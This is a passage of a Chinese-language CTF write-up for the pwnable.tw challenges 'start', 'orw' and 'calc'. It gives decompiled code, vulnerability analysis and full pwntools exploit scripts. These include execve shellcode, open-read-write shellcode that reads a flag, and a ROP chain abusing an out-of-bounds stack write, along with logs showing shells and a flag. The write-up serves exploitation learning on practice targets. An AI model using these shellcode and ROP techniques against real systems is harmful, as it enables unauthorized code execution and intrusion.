remote(&apos;chall.pwnable.tw&apos;,10000)</span><br><span class="line"></span><br><span class="line">shellcode =&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot; </span><br><span class="line">print len(shellcode)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*20 + p32(0x8048087) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">leak_addr = u32(sh.recv(4))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">esp_addr = leak_addr + 0x14</span><br><span class="line">pay = &apos;a&apos;*20 + p32(esp_addr) + shellcode</span><br><span class="line">sh.send(pay) </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">21</span><br><span class="line">0xff936bc0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x005o\x93\xff\x00\x00\x00\x00Go\x93\xff</span><br><span class="line">$ whoami</span><br><span class="line">start</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">orw_seccomp():</span><br><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(38, 1, 0, 0, 0);                        // 38 PR_SET_NO_NEW_PRIVS</span><br><span class="line">                                                //               将调用线程的no_new_privs位设置为值</span><br><span class="line">                                                //               ARG2。将no_new_privs设置为1，execve（2）承诺不会</span><br><span class="line">                                                //               授予执行任何无法完成的任务的权限</span><br><span class="line">                                                //               没有execve（2）调用（例如，渲染集合 - </span><br><span class="line">                                                //               user-ID和set-group-ID模式位，以及非文件功能</span><br><span class="line">                                                //               功能性的）。设置后，该位不能取消设置。那个设定</span><br><span class="line">                                                //               这个位是由fork（2）和</span><br><span class="line">                                                //               克隆（2），并保存在execve（2）。</span><br><span class="line">                                                // </span><br><span class="line">  prctl(22, 2, &amp;v1);                            // 22 PR_SET_SECCOMP  </span><br><span class="line">                                                //   seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,       这是不安全的,</span><br><span class="line">                                                // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</span><br><span class="line">                                                // 大概是终结了系统调用的可能,也就很难getshell了。</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西<br>看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。</p><p>这块可以参考<br><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a><br><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/prctl.2.html</a></p><p>因为看不了题，不过在源码里能看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">             &lt;!-- description --&gt;</span><br><span class="line">               </span><br><span class="line">              &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛</p><figure class="image-box">                <img src="/2018/11/06/pwnable-tw-wp/sys_call.png" alt="" 系统调用""="" title="" class="">                <p>"系统调用"</p>            </figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>简直就是汇编实习现场了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./orw&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"></span><br><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">mov ebx,esp;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x5;</span><br><span class="line">int 0x80;                    //open</span><br><span class="line"></span><br><span class="line">mov ebx,eax;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x3;</span><br><span class="line">mov ecx,esp;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                    //read</span><br><span class="line"></span><br><span class="line">mov al,0x4;</span><br><span class="line">mov bl,1;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                     //write</span><br><span class="line">&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Give my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br><span class="line">�u�\x0[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>前面还一对代码说题目干净，这个题就开始一堆代码了。。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">unsigned int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+18h] [ebp-5A0h]</span><br><span class="line">  int v2[100]; // [esp+1Ch] [ebp-59Ch]</span><br><span class="line">  char s; // [esp+1ACh] [ebp-40Ch]</span><br><span class="line">  unsigned int v4; // [esp+5ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, 0x400u);                          // 置字节字符串前n个字节为零且包括‘\0’。 </span><br><span class="line">    if ( !get_expr((int)&amp;s, 1024) )</span><br><span class="line">      break;</span><br><span class="line">    init_pool(&amp;v1);                            //初始化v1</span><br><span class="line">    if ( parse_expr((int)&amp;s, &amp;v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;_d, v2[v1 - 1]);</span><br><span class="line">      fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_pool():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl init_pool(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    a1[i + 1] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST2C_4</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // [esp+20h] [ebp-88h]</span><br><span class="line">  int i; // [esp+24h] [ebp-84h]</span><br><span class="line">  int O; // [esp+28h] [ebp-80h]</span><br><span class="line">  char *s1; // [esp+30h] [ebp-78h]</span><br><span class="line">  int num_left; // [esp+34h] [ebp-74h]</span><br><span class="line">  char s[100]; // [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v11; // [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(0x14u);</span><br><span class="line">  v5 = a1;</span><br><span class="line">  O = 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + a1 - v5;</span><br><span class="line">      s1 = (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v5, v2);</span><br><span class="line">      s1[v2] = 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )                   // 输入不能为0</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      num_left = atoi(s1);</span><br><span class="line">      if ( num_left &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*a2)++;                      // v4为操作数数目</span><br><span class="line">        a2[v4 + 1] = num_left;             // 操作数放入a2[1],a2[2],....</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )   // 若下一个操作数仍未操作符即报错</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      v5 = i + 1 + a1;</span><br><span class="line">      if ( s[O] )                               // s[0]为操作数数目</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *(char *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case &apos;%&apos;:</span><br><span class="line">          case &apos;*&apos;:</span><br><span class="line">          case &apos;/&apos;:</span><br><span class="line">            if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[O]);</span><br><span class="line">              s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              s[++O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case &apos;+&apos;:</span><br><span class="line">          case &apos;-&apos;:</span><br><span class="line">            eval(a2, s[O]);</span><br><span class="line">            s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[O--]);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( O &gt;= 0 )</span><br><span class="line">    eval(a2, s[O--]);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func eval():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == &apos;-&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == &apos;/&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == &apos;*&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1; </span><br><span class="line">  --*a1;</span><br><span class="line">  return result;                             // 每一次计算的结果储存在 a1[1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>  看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。</p><p>  程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数<br>  用num来表示a1</p><p>  则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是：<br>  num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2]</p><p>  看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100<br>  num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101</p><p>  可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100]<br>  也就可以泄露栈内存了！！</p><p>  第二步，假如输入 +100+12，计算逻辑便是：<br>  num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12    //为什么12会在num[101]处</p><p>  总之，这样子便能对任意栈地址写了！！</p><p>  由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary）</p><p>  因为输入输出什么的都是数字，所以系统调用最为明智。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./calc&apos;)</span><br><span class="line">bin = ELF(&apos;./calc&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!!!!     ROPgadget --binary ./calc  --ropchain     !!!!直接生成完整的rop链，简直不要太可怕</span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line">p+=p32(0x804967a)</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">for i in range(len(p)/4-1):</span><br><span class="line">    sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><p>下面这个是相对正常的exp。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p=remote(&apos;chall.pwnable.tw&apos;,10100)</span><br><span class="line">#p=process(&quot;./calc&quot;)</span><br><span class="line">key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;+360&apos;)</span><br><span class="line">addr_bp=int(p.recv())</span><br><span class="line">addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16</span><br><span class="line">addr_str=addr_re+20-0x100000000</span><br><span class="line">addr=361</span><br><span class="line">for i in range(5):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(5,8):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.send(&apos;kirin&apos;+&apos;\n&apos;)</span><br><span 